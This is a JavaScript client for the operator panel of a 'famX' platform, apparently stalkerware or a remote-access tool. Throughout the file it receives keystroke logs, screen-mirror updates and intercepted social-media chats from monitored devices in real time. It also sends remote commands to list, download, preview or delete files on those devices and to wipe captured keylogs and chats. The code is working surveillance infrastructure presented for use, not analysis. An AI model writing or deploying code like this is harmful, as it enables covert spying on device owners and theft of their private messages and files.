// famX Realtime Platform Client (Direct Socket.io & REST API, Zero External Dependencies)
(function() {
  'use strict';

  // Connect to native Flask Socket.io server
  const socket = typeof io !== 'undefined' ? io() : null;
  const listeners = {};

  if (socket) {
    socket.on('connect', () => {
      console.log("[famX Platform] Real-time socket connected successfully");
    });

    socket.on('device_status_change', (data) => {
      if (data && data.device_id) {
        triggerListeners(`devices/${data.device_id}`);
        triggerListeners(`devices/${data.device_id}/info`);
      }
    });

    socket.on('keylog_received', (data) => {
      if (data && data.device_id) {
        triggerListeners(`devices/${data.device_id}/keylogs`, 'child_added', data);
      }
    });

    socket.on('files_updated', (data) => {
      if (data && data.device_id) {
        triggerListeners(`devices/${data.device_id}/files`);
      }
    });

    socket.on('mirror_update', (data) => {
      if (data && data.device_id) {
        triggerListeners(`devices/${data.device_id}/mirror`);
      }
    });

    socket.on('preview_ready', (data) => {
      if (window.onPreviewReady) {
        window.onPreviewReady(data);
      }
    });

    socket.on('social_message_received', (data) => {
      if (data && data.device_id) {
        triggerListeners(`devices/${data.device_id}/chats/${data.platform}`);
        triggerListeners(`devices/${data.device_id}/chats/${data.platform}/${data.contact}/messages`);
      }
    });
  }

  function triggerListeners(path, eventType = 'value', extraData = null) {
    if (!listeners[path]) return;
    
    listeners[path].forEach(item => {
      if (item.eventType !== eventType) return;

      if (eventType === 'value') {
        const parts = path.split('/');
        const deviceId = parts[1];
        if (!deviceId || deviceId === 'undefined') {
          fetch('/api/devices')
            .then(r => r.json())
            .then(devicesList => {
              const devicesMap = {};
              (devicesList || []).forEach(d => {
                devicesMap[d.id || d._id] = d;
              });
              const snapshot = {
                val: () => devicesMap,
                key: 'devices'
              };
              item.callback(snapshot);
            })
            .catch(e => console.error("[famX Platform] Devices Fetch Error:", e));
          return;
        }

        fetch(`/api/device/${deviceId}/data`)
          .then(r => r.json())
          .then(deviceData => {
            let val = deviceData;
            const pathParts = parts.slice(2);
            pathParts.forEach(p => {
              if (val) val = val[p];
            });

            const snapshot = {
              val: () => val,
              key: pathParts[pathParts.length - 1] || deviceId
            };
            item.callback(snapshot);
          })
          .catch(e => console.error("[famX Platform] Fetch Error:", e));

      } else if (eventType === 'child_added' && extraData) {
        const snapshot = {
          val: () => extraData,
          key: extraData.time || Date.now()
        };
        item.callback(snapshot);
      }
    });
  }

  // Create clean famX platform database object
  const famXDB = {
    ref: function(path) {
      return {
        on: function(eventType, callback) {
          if (!listeners[path]) listeners[path] = [];
          listeners[path].push({ eventType, callback });

          if (eventType === 'value') {
            triggerListeners(path, 'value');
          } else if (eventType === 'child_added') {
            const parts = path.split('/');
            const deviceId = parts[1];
            if (deviceId) {
              fetch(`/api/device/${deviceId}/data`)
                .then(r => r.json())
                .then(deviceData => {
                  const pathParts = parts.slice(2);
                  let val = deviceData;
                  pathParts.forEach(p => {
                    if (val) val = val[p];
                  });
                  if (val && typeof val === 'object') {
                    Object.values(val).forEach(item => {
                      const snapshot = {
                        val: () => item,
                        key: (item && item.time) ? item.time : Date.now()
                      };
                      callback(snapshot);
                    });
                  }
                })
                .catch(e => console.error("[famX Platform] child_added Error:", e));
            }
          }
        },
        once: function(eventType, callback) {
          const parts = path.split('/');
          const deviceId = parts[1];
          if (!deviceId || deviceId === 'undefined') {
            fetch('/api/devices')
              .then(r => r.json())
              .then(devicesList => {
                const devicesMap = {};
                (devicesList || []).forEach(d => {
                  devicesMap[d.id || d._id] = d;
                });
                callback({
                  val: () => devicesMap,
                  key: 'devices'
                });
              })
              .catch(e => console.error("[famX Platform] once Error:", e));
            return;
          }

          fetch(`/api/device/${deviceId}/data`)
            .then(r => r.json())
            .then(deviceData => {
              const pathParts = parts.slice(2);
              let val = deviceData;
              pathParts.forEach(p => {
                if (val) val = val[p];
              });
              callback({
                val: () => val,
                key: pathParts[pathParts.length - 1] || deviceId
              });
            })
            .catch(e => console.error("[famX Platform] once Error:", e));
        },
        off: function(eventType) {
          if (listeners[path]) {
            if (eventType) {
              listeners[path] = listeners[path].filter(item => item.eventType !== eventType);
            } else {
              delete listeners[path];
            }
          }
        },
        set: function(value, onComplete) {
          const parts = path.split('/');
          if (parts[0] === 'commands' && parts[2] === 'file_manager') {
            const deviceId = parts[1];
            const action = (value && value.action) || '';
            let payloadAction = action;

            if (action === 'LIST_FILES') {
              payloadAction = 'LIST_FILES:' + (value.path || '');
            } else if (action === 'DELETE_FILE') {
              payloadAction = 'DELETE_FILE:' + (value.path || '');
            } else if (action === 'DOWNLOAD_FILE') {
              payloadAction = 'DOWNLOAD_FILE:' + (value.target || '');
            } else if (action === 'PREVIEW_FILE') {
              payloadAction = 'PREVIEW_FILE:' + (value.target || '');
            }

            fetch(`/api/device/${deviceId}/action`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ action: payloadAction })
            })
              .then(r => r.json())
              .then(res => {
                if (onComplete) onComplete(null, res);
              })
              .catch(err => {
                if (onComplete) onComplete(err);
              });
          } else {
            if (onComplete) onComplete(null);
          }
        },
        remove: function(onComplete) {
          const parts = path.split('/');
          const deviceId = parts[1];
          if (!deviceId) {
            if (onComplete) onComplete(null);
            return;
          }

          if (parts[2] === 'keylogs') {
            fetch(`/api/device/${deviceId}/clear_keylogs`, { method: 'POST' })
              .then(() => { if (onComplete) onComplete(null); })
              .catch(e => { if (onComplete) onComplete(e); });
          } else if (parts[2] === 'media') {
            const mediaKey = parts[3];
            fetch(`/api/device/${deviceId}/delete_media/${mediaKey}`, { method: 'POST' })
              .then(() => { if (onComplete) onComplete(null); })
              .catch(e => { if (onComplete) onComplete(e); });
          } else if (parts[2] === 'chats') {
            const platform = parts[3];
            const contact = parts[4];
            fetch(`/api/device/${deviceId}/clear_chats`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ platform: platform, contact: contact })
            })
              .then(() => { if (onComplete) onComplete(null); })
              .catch(e => { if (onComplete) onComplete(e); });
          } else {
            if (onComplete) onComplete(null);
          }
        },
        limitToLast: function() { return this; }
      };
    }
  };

  // Expose famX Client API globally
  window.famX = {
    socket: socket,
    database: function() { return famXDB; }
  };
  window.socket = socket;
  window.db = famXDB;
})();
